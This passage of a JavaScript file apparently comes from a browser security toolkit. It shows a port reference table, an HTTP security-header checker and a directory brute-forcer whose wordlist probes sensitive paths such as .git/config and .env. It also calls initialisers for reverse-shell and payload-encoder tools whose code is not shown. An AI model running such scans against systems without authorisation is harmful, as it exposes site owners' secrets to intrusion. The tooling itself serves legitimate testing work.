    [3306, "tcp", "MySQL"], [3389, "tcp", "RDP"], [3690, "tcp", "SVN"], [4444, "tcp", "Metasploit default"],
    [5000, "tcp", "UPnP / dev servers"], [5432, "tcp", "PostgreSQL"], [5900, "tcp", "VNC"],
    [5985, "tcp", "WinRM HTTP"], [5986, "tcp", "WinRM HTTPS"], [6379, "tcp", "Redis"],
    [6660, "tcp", "IRC"], [6697, "tcp", "IRC SSL"], [8000, "tcp", "HTTP alt"], [8009, "tcp", "AJP"],
    [8080, "tcp", "HTTP proxy/alt"], [8443, "tcp", "HTTPS alt"], [8888, "tcp", "HTTP alt"],
    [9000, "tcp", "PHP-FPM / misc"], [9200, "tcp", "Elasticsearch"], [11211, "tcp", "Memcached"],
    [27017, "tcp", "MongoDB"], [50000, "tcp", "SAP / misc"]
  ];
  function initPortLookup() {
    var input = $("port-search");
    var table = $("port-table-body");
    if (!input) return;
    function render(filter) {
      var f = (filter || "").toLowerCase();
      table.innerHTML = PORTS.filter(function (p) {
        return !f || String(p[0]).indexOf(f) !== -1 || p[2].toLowerCase().indexOf(f) !== -1 || p[1].indexOf(f) !== -1;
      }).map(function (p) {
        return "<tr><td>" + p[0] + "</td><td>" + p[1] + "</td><td>" + p[2] + "</td></tr>";
      }).join("");
    }
    input.addEventListener("input", function () { render(input.value); });
    render("");
  }

  // ---------------------------------------------------------------------
  // 16. HTTP header analyzer
  // ---------------------------------------------------------------------
  function initHeaderAnalyzer() {
    var btn = $("headers-btn");
    if (!btn) return;
    btn.addEventListener("click", function () {
      var raw = $("headers-input").value;
      var out = $("headers-output");
      var lines = raw.split("\n").map(function (l) { return l.trim(); }).filter(Boolean);
      var map = {};
      lines.forEach(function (l) {
        var idx = l.indexOf(":");
        if (idx === -1) return;
        map[l.slice(0, idx).trim().toLowerCase()] = l.slice(idx + 1).trim();
      });
      var checks = [
        ["content-security-policy", "CSP", "mitigates XSS/injection"],
        ["strict-transport-security", "HSTS", "forces HTTPS"],
        ["x-content-type-options", "X-Content-Type-Options", "stops MIME sniffing"],
        ["x-frame-options", "X-Frame-Options", "mitigates clickjacking"],
        ["referrer-policy", "Referrer-Policy", "limits referrer leakage"],
        ["permissions-policy", "Permissions-Policy", "restricts browser features"]
      ];
      var findings = [];
      checks.forEach(function (c) {
        findings.push((map[c[0]] ? "[present] " : "[MISSING] ") + c[1] + " — " + c[2] + (map[c[0]] ? (": " + map[c[0]]) : ""));
      });
      if (map["server"]) findings.push("[info] Server header leaks: " + map["server"]);
      if (map["x-powered-by"]) findings.push("[info] X-Powered-By leaks: " + map["x-powered-by"]);
      if (map["set-cookie"]) {
        var cookie = map["set-cookie"];
        var flags = [];
        if (!/secure/i.test(cookie)) flags.push("missing Secure");
        if (!/httponly/i.test(cookie)) flags.push("missing HttpOnly");
        if (!/samesite/i.test(cookie)) flags.push("missing SameSite");
        findings.push("[cookie] " + (flags.length ? flags.join(", ") : "looks properly flagged"));
      }
      out.textContent = findings.join("\n");
    });
  }

  // ---------------------------------------------------------------------
  // 17. directory / file brute-forcer (gobuster-lite)
  //
  // Runs entirely as browser fetch() calls against whatever target URL
  // you give it -- there's no server on this end relaying anything.
  // That means it's bound by the same CORS rules as any other page JS:
  // it gets real status codes back from same-origin targets and from
  // servers/APIs that opt into permissive CORS, and a generic network
  // error for everything else (reported as "blocked", not "missing").
  // ---------------------------------------------------------------------
  var DEFAULT_WORDLIST = [
    "admin", "administrator", "api", "api/v1", "assets", "backup", "backups",
    ".git", ".git/config", ".env", ".htaccess", "config", "config.php",
    "dashboard", "db", "debug", "dev", "docs", "download", "downloads",
    "images", "img", "index", "index.php", "install", "js", "css", "login",
    "logout", "old", "phpinfo.php", "private", "public", "register",
    "robots.txt", "scripts", "secret", "server-status", "sitemap.xml",
    "static", "staging", "storage", "temp", "test", "tmp", "upload",
    "uploads", "user", "users", "wp-admin", "wp-content", "wp-login.php"
  ];

  function classifyProbe(status, type) {
    if (type === "opaqueredirect") return "redirect";
    if (type === "error" || type === "timeout") return "blocked";
    if (status === 401 || status === 403) return "protected";
    if (status >= 200 && status < 300) return "hit";
    if (status >= 300 && status < 400) return "redirect";
    if (status === 404) return "miss";
    if (status >= 500) return "servererr";
    return "other";
  }

  function probePath(base, path, signal) {
    var url = base.replace(/\/+$/, "") + "/" + path.replace(/^\/+/, "");
    var fetchPromise = fetch(url, { method: "GET", redirect: "manual", signal: signal, cache: "no-store" })
      .then(function (res) {
        return { path: path, status: res.type === "opaqueredirect" ? null : res.status, type: res.type };
      })
      .catch(function (err) {
        if (err.name === "AbortError") throw err;
        return { path: path, status: null, type: "error" };
      });
    var timeoutPromise = new Promise(function (resolve) {
      setTimeout(function () { resolve({ path: path, status: null, type: "timeout" }); }, 8000);
    });
    return Promise.race([fetchPromise, timeoutPromise]);
  }

  function initBuster() {
    var startBtn = $("buster-start-btn");
    if (!startBtn) return;
    var stopBtn = $("buster-stop-btn");
    var wordlistInput = $("buster-wordlist");
    var targetInput = $("buster-target");
    var extInput = $("buster-ext");
    var concurrencySel = $("buster-concurrency");
    var resultsBody = $("buster-results-body");
    var statusEl = $("buster-status");
    var abortCtrl = null;

    $("buster-default-btn").addEventListener("click", function () {
      wordlistInput.value = DEFAULT_WORDLIST.join("\n");
    });

    stopBtn.addEventListener("click", function () {
      if (abortCtrl) abortCtrl.abort();
    });

    startBtn.addEventListener("click", function () {
      var target = targetInput.value.trim();
      if (!target) {
        statusEl.textContent = "enter a target URL first";
        return;
      }
      if (!/^https?:\/\//i.test(target)) target = "https://" + target;

      var words = wordlistInput.value.split("\n").map(function (w) { return w.trim(); }).filter(Boolean);
      if (words.length === 0) words = DEFAULT_WORDLIST.slice();
      var exts = extInput.value.split(",").map(function (e) { return e.trim(); }).filter(Boolean);

      var queue = [];
      words.forEach(function (w) {
        queue.push(w);
        exts.forEach(function (e) { queue.push(w + (e.charAt(0) === "." ? e : "." + e)); });
      });

      if (queue.length > 4000) {
        statusEl.textContent = "that's " + queue.length + " requests -- trim the wordlist/extensions (max 4000) so this doesn't hang the tab";
        return;
      }

      resultsBody.innerHTML = "";
      var counts = { hit: 0, redirect: 0, protected: 0, miss: 0, blocked: 0, servererr: 0, other: 0 };
      var done = 0;
      var concurrency = parseInt(concurrencySel.value, 10) || 5;

      abortCtrl = new AbortController();
      startBtn.disabled = true;
      stopBtn.disabled = false;
      statusEl.textContent = "scanning 0 / " + queue.length + "...";

      var idx = 0;
      var active = 0;

      new Promise(function (resolve) {
        function pump() {
          if (abortCtrl.signal.aborted) {
            if (active === 0) resolve();
            return;
          }
          if (idx >= queue.length) {
            if (active === 0) resolve();
            return;
          }
          while (active < concurrency && idx < queue.length) {
            (function (path) {
              active++;
              probePath(target, path, abortCtrl.signal).then(function (result) {
                active--;
                done++;
                var cls = classifyProbe(result.status, result.type);
                counts[cls] = (counts[cls] || 0) + 1;
                if (cls !== "miss" && cls !== "blocked") {
                  var row = document.createElement("tr");
                  row.className = "buster-" + cls;
                  row.innerHTML =
                    "<td>/" + escapeHtml(path) + "</td><td>" +
                    (result.status !== null ? result.status : result.type) +
                    "</td><td>" + cls + "</td>";
                  resultsBody.appendChild(row);
                }
                statusEl.textContent = "scanning " + done + " / " + queue.length +
                  "  (" + counts.hit + " hit, " + counts.protected + " protected, " +
                  counts.redirect + " redirect, " + counts.blocked + " blocked)";
                pump();
              });
            })(queue[idx++]);
          }
        }
        pump();
      }).then(function () {
        startBtn.disabled = false;
        stopBtn.disabled = true;
        var summary = (abortCtrl.signal.aborted ? "stopped" : "done") +
          " -- " + done + "/" + queue.length + " checked, " + counts.hit + " hit, " +
          counts.protected + " protected, " + counts.redirect + " redirect, " +
          counts.blocked + " blocked/CORS, " + counts.miss + " 404";
        if (counts.blocked > done * 0.5) {
          summary += "\nmost requests were blocked -- this only works reliably against same-origin targets or CORS-permissive servers/APIs, not arbitrary third-party sites.";
        }
        statusEl.textContent = summary;
      });
    });
  }

  document.addEventListener("DOMContentLoaded", function () {
    initEncoder();
    initHasher();
    initHmac();
    initHashId();
    initJwt();
    initXor();
    initRegex();
    initCidr();
    initIpConv();
    initUaParser();
    initRevshell();
    initPayloadEncoder();
    initPassStrength();
    initWordlist();
    initPortLookup();
    initHeaderAnalyzer();
    initBuster();
  });
})();
